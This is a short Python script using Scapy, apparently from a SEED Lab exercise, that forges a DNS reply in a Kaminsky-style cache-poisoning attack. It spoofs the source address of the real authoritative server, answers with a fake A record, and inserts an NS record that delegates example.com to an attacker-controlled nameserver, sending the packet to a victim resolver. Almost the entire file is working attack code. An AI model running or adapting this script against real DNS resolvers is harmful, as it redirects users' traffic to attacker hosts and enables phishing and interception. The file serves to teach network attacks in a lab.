from scapy.all import *

# Configuration
target_name = 'abcde.example.com' # Must match the query name
target_domain = 'example.com'
attacker_ns = 'ns.attacker32.com' # Malicious nameserver controlled by attacker

# 1. Question Section
dns_question = DNSQR(qname=target_name)

# 2. Answer Section - Providing a spoofed IP for the query
dns_answer = DNSRR(rrname=target_name, type='A', rdata='1.2.3.4', ttl=259200)

# 3. Authority Section - The Actual Poison
# Instructs the resolver to delegate future queries for example.com to the attacker's nameserver
dns_authority = DNSRR(rrname=target_domain, type='NS', rdata=attacker_ns, ttl=259200)

# DNS Packet Assembly
dns_header = DNS(id=0xAAAA, aa=1, rd=0, qr=1,
                qdcount=1, ancount=1, nscount=1, arcount=0,
                qd=dns_question, an=dns_answer, ns=dns_authority)

# network Layers (IP and UDP)
# src: IP of the real authoritative nameserver being spoofed
# dst: Victim Local DNS Server (10.9.0.53)
ip_layer = IP(dst='10.9.0.53', src='93.184.216.34') 

# dport: Fixed to 33333 for the SEED Lab environment
udp_layer = UDP(dport=33333, sport=53, chksum=0)

# Build and send the spoofed response
spoofed_reply = ip_layer/udp_layer/dns_header
send(spoofed_reply, verbose=0)
